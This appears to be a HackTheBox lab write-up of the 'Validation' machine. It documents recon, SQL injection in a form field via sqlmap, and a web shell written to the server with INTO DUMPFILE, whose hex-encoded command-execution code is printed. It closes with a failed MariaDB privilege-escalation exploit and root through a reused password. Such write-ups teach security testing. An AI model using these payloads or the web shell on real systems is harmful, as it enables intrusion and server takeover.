---
layout: post
title:  "HackTheBox: Validation"
date:   2022-02-02 10:00:00 +1000
categories: red-team
tags: linux sql-injection password-reuse
excerpt_separator: <!--more-->
---

**Validation** is a Linux-based machine authored by *ippsec*, with an average rating of 5.0 stars.

<!--more-->

<p align="center"><img src="/assets/images/validation/main.png" /></p>

### // Recon
```
nmap -A validation.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 10:18 AEST
Nmap scan report for validation.htb (10.10.11.116)
Host is up (0.046s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http          Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
8080/tcp open     http          nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.75 seconds
```

Nmap reveals ssh running on 22, and web-servers on both 80 (apache) and 8080 (ngninx). There are a number of ports in the 5000 range that are reported as filtered, meaning nmap can't determine an accurate open/closed status, likely due to packet filtering.

Visiting the site on port 80 returns some kind of basic registration form:

<p align="center"><img src="/assets/images/validation/1.png" /></p>

The response headers indicate the web-server is *Apache/2.4.48 (Debian)* and runs on *PHP/7.4.23*. We can enter any random values for the username and country and submit, and the form is redirected to `/account.php`:

<p align="center"><img src="/assets/images/validation/2.png" /></p>

If we keep selecting the same country but entering a different username (e.g *test2*) then we see both of our users on the account screen. This suggests there is some kind of database backend running, to store our submissions.

No other links or pages are visible, and trying to access the server on the other open http port (8080) only returns a `502 Bad Gateway` error. Now is probably a good time to search for additional content using [gobuster](https://github.com/OJ/gobuster):

```
gobuster dir -u http://validation.htb:80/ -w ~/Sites/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-files.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://validation.htb:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Sites/github/danielmiessler/SecLists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/02/02 10:36:58 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 16088]
/account.php          (Status: 200) [Size: 16]
/config.php           (Status: 200) [Size: 0]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.                    (Status: 200) [Size: 16088]
/.html                (Status: 403) [Size: 279]
/.html.php            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htm.php             (Status: 403) [Size: 279]
/.htm                 (Status: 403) [Size: 279]
/.htpasswds           (Status: 403) [Size: 279]

===============================================================
2022/02/02 10:39:05 Finished
===============================================================
```

We learn that there is also a `/config.php` file, but various kinds of requests (GET/POST/OPTIONS) to this path don't return any content.

Returning to the idea that a database is part of the site, we can check to see if there are any possible SQL injection vulnerabilties. Entering a username value that might indicate a vulnerability (e.g. `test3'`) doesn't seem to have any impact, but intercepting the POST request in Burp and modifying the country value does:
```
POST / HTTP/1.1
Host: validation.htb
Content-Length: 35
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://validation.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://validation.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: user=fccdc4890a797aca54d996fc5f185fbb
Connection: close

username=test3&country=Argentina%27
```

<p align="center"><img src="/assets/images/validation/3.png" /></p>

This indicates there may be a vulnerability here, which [sqlmap](https://sqlmap.org/) should be able to help us confirm. We need to tell it the url to test, the data we want to send (as this is a POST request) and the parameter we want to test, in this case *country*:
```
python sqlmap.py -u "http://validation.htb/" --data="username=test&country=Argentina" -p 'country'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.1.7#dev}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:10:11 /2022-02-02/

[11:10:11] [INFO] testing connection to the target URL
got a 302 redirect to 'http://validation.htb:80/account.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
you have not declared cookie(s), while server wants to set its own ('user=4cfad707612...839a1e3e15'). Do you want to use those [Y/n] y
[11:10:27] [INFO] testing if the target URL content is stable
[11:10:27] [WARNING] heuristic (basic) test shows that POST parameter 'country' might not be injectable
[11:10:27] [INFO] testing for SQL injection on POST parameter 'country'
[11:10:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:10:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:10:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:10:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:10:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[11:10:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[11:10:29] [INFO] testing 'Generic inline queries'
[11:10:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:10:29] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
...
[11:10:39] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 11:10:39 /2022-02-02/
```

At this stage it looks like nothing was found, but let's take the output's suggestion of running with increased `--level/--risk` settings and try again:
```
python sqlmap.py -u "http://validation.htb/" --data="username=test6&country=Argentina" -p 'country' --level=5 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.1.7#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:11:13 /2022-02-02/

RuntimeError: module compiled against API version 0xe but this version of numpy is 0xd
RuntimeError: module compiled against API version 0xe but this version of numpy is 0xd
[11:11:13] [INFO] testing connection to the target URL
got a 302 redirect to 'http://validation.htb:80/account.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
you have not declared cookie(s), while server wants to set its own ('user=4cfad707612...839a1e3e15'). Do you want to use those [Y/n] y
[11:11:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:11:28] [INFO] testing if the target URL content is stable
[11:11:28] [WARNING] heuristic (basic) test shows that POST parameter 'country' might not be injectable
[11:11:29] [INFO] heuristic (XSS) test shows that POST parameter 'country' might be vulnerable to cross-site scripting (XSS) attacks
[11:11:29] [INFO] testing for SQL injection on POST parameter 'country'
[11:11:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:11:29] [WARNING] reflective value(s) found and filtering out
[11:11:29] [INFO] POST parameter 'country' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[11:11:32] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
[11:11:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[11:11:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[11:11:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[11:11:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[11:11:45] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[11:11:45] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[11:11:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[11:11:45] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[11:11:46] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:11:46] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[11:11:46] [INFO] POST parameter 'country' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[11:11:46] [INFO] testing 'Generic inline queries'
[11:11:46] [INFO] testing 'MySQL inline queries'
[11:11:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[11:11:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[11:11:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[11:11:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[11:11:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[11:11:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[11:11:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:11:58] [INFO] POST parameter 'country' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[11:11:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:11:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:11:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:11:59] [INFO] target URL appears to have 1 column in query
[11:11:59] [INFO] POST parameter 'country' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'country' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: country (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=test6&country=Argentina' AND 5540=5540-- zVXt

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=test6&country=Argentina' OR (SELECT 8149 FROM(SELECT COUNT(*),CONCAT(0x7171766271,(SELECT (ELT(8149=8149,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AMPC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test6&country=Argentina' AND (SELECT 6388 FROM (SELECT(SLEEP(5)))wzGm)-- kpHR

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: username=test6&country=Argentina' UNION ALL SELECT CONCAT(0x7171766271,0x7175734961666a734e6b676f6e726d595154636c6770464b6f5a535a6d7a776165526a73586e424d,0x7176767671)-- -
---
[11:12:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 11 (bullseye)
web application technology: PHP 7.4.23, Apache 2.4.48
back-end DBMS: MySQL >= 5.0 (MariaDB fork)

[*] ending @ 11:12:15 /2022-02-02/
```

That's more like it! We now know that `country` is vulnerable, and have some example payloads to prove it. The [sqlmap manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage) details a lot of features that can now be used, including dumping tables, injecting user-defined functions and even uploading files:
```
python sqlmap.py -u "http://validation.htb/" --data="username=test&country=Argentina" -p 'country' --level=5 --risk=3 --file-write "~/Desktop/shell.php" --file-dest "/var/www/html/shell.php" -v 3
```

This command will take the local file, `~/Desktop/shell.php` (a php web-shell) and upload it to `/var/www/html/shell.php`. Running with an increased verbosity level (`-v 3`) shows us how the script is executing the command and moving the file onto the server:
```
...
[08:07:34] [PAYLOAD] -8403' UNION ALL SELECT 0x3c68746d6c3e0a0a3c626f64793e0a0a3c666f726d206d6574686f643d22504f535422206e616d653d223c3f706870206563686f20626173656e616d6528245f5345525645525b275048505f53454c46275d293b203f3e223e0a0a3c696e70757420747970653d225445585422206e616d653d22636d6422206175746f666f6375732069643d22636d64222073697a653d223830223e0a0a3c696e70757420747970653d225355424d4954222076616c75653d2245786563757465223e0a0a3c2f666f726d3e0a0a3c7072653e0a0a3c3f7068700a0a696628697373657428245f504f53545b27636d64275d29290a0a7b0a0a73797374656d28245f504f53545b27636d64275d2e2720323e263127293b0a0a7d0a0a3f3e0a0a3c2f7072653e0a0a3c2f626f64793e0a0a3c2f68746d6c3e INTO DUMPFILE '/var/www/html/shell.php'-- -
```

The select string (`0x3c..`) is the file contents encoded into hex, and the `INTO DUMPFILE` directive is where the script exploits the server and stores the file in a web-server accessible location. Normally this function is used to dump legitimate data from the database into a file, but as shown it can also be mis-used to write arbirary data/files to the server.

Once the script completes, we have a typical web-shell available at `http://validation.htb/shell.php`. From here we can confirm our user account (`www-data`) and access the user flag within the `/home/htb` directory:

<p align="center"><img src="/assets/images/validation/4.png" /></p>

### // Privilege Escalation

We can confirm via our shell that `curl` is available on the server, so it's straightforward to upload various tools to look for pathways to privlege escalation. [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and several similar tools generate a lot of output, but in this case don't report anything too interesting. Our `www-data` user doesn't even have a real shell, and `/etc/passwd` confirms there are no other shell-enabled accounts beside root that we might move to laterally. Checking for additional services that might be running on internal interfaces is made difficult because the `netstat` binary is not available, but again we can upload this via `curl` (also as [this article](https://staaldraad.github.io/2017/12/20/netstat-without-netstat/) points out, it's possible to derive the same information from `/proc/net/tcp` and `/proc/net/udp`, albeit with some additional decoding required). MariaDB is running on the localhost interface, and the contents of `/var/www/html/config.php` show us how to connect:
```
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

There really isn't anything new here, as we already had access to the database via the sql-injection exploit. At this point I started searching for known exploits for some of the software found, and came across the following for MariaDB:
```
searchsploit -w mariadb
------------------------------------------------------------------------ --------------------------------------------
 Exploit Title                                                          |  URL
------------------------------------------------------------------------ --------------------------------------------
...

MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Pri | https://www.exploit-db.com/exploits/40360
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'mysql' System User Pri | https://www.exploit-db.com/exploits/40678
MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - 'root' System User Priv | https://www.exploit-db.com/exploits/40679
...
------------------------------------------------------------------------ --------------------------------------------
```

The mentions of privilege escalation caught my eye, so I read through the exploits in more detail. It turns out there was a vulnerability discovered that would allow you to achieve access to the `mysql` user via a race-condition, and then a second exploit that would allow you to move from `mysql` to `root` via unsafe error log handling. This two-step privesc seemed very much in the style of a CTF, so I set about running the first exploit. It's written in C, and unfortunately some of the shared libraries aren't available on the target box. So instead I spun up a similar Ubuntu-based docker container and compiled it there. In addition to uploading the binary to the target, I also had to upload a shared library that was missing, as well as modify the `LD_LIBRARY_PATH` environment variable. Eventually I was able to run the exploit:
```
www-data@validation:/tmp$ ./mysql-privesc-race uhc "uhc-9qual-global-pw" localhost registration
<ce uhc "uhc-9qual-global-pw" localhost registration

MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit
mysql-privesc-race.c (ver. 1.0)

CVE-2016-6663 / OCVE-2016-5616

For testing purposes only. Do no harm.

Discovered/Coded by:

Dawid Golunski
http://legalhackers.com


[+] Starting the exploit as:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Connecting to the database `registration` as uhc@localhost

[+] Creating exploit temp directory /tmp/mysql_privesc_exploit

[+] Creating mysql tables

DROP TABLE IF EXISTS exploit_table
DROP TABLE IF EXISTS mysql_suid_shell
CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit'
CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit'

[+] Copying bash into the mysql_suid_shell table.
    After the exploitation the following file/table will be assigned SUID and executable bits :
-rw-rw---- 1 mysql www-data 1234376 Feb  2 23:28 /tmp/mysql_privesc_exploit/mysql_suid_shell.MYD

[+] Entering the race loop... Hang in there...
->->->->->->->->->->->->->->->->->->->->->->->->->->->->->
```

And then I waited.. and waited.. and waited some more. A demo video of the exploit showed it catching the race condition in about 5 seconds, but after 30 minutes my attempt was still running. Eventually I did what I should have done right at the start and checked the exact version of MariaDB that was installed - `Ver 15.1 Distrib 10.5.11-MariaDB` against the vulnerable versions listed in the exploit writeup - `MariaDB < 5.5.52, < 10.1.18 and < 10.0.28` - and concluded that I was probably trying to use an incompatible exploit.

Returning to the machine after a break, I browsed through the very limited web-site code again. On some HTB machines, passwords revealed in the code can be re-used in other locations, e.g. an admin panel. There wasn't any kind of admin interface on this site, and not even another user on the machine besides root... surely not?
```
www-data@validation:/var/www/html$ su -
su -
Password: uhc-9qual-global-pw
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
6b******************************
```

I can't pretend that this wasn't a pretty frustrating conclusion to the machine, but given the propensity for humans to reuse passwords, this machine certainly scores high on real-world applicability (or as Ive heard it said before in the cyber-security realm, "it's not dumb if it works")

### // Lessons Learned
1. Despite how obvious an exploit might seem to suit your machine (or how well it "seems" to be working) always confirm the version of software in use is actually vulnerable, before investing time in it
2. Password re-use happens in the real world, so there's no reason not to expect it in a CTF

<p align="center"><img src="/assets/images/validation/5.png" /></p>
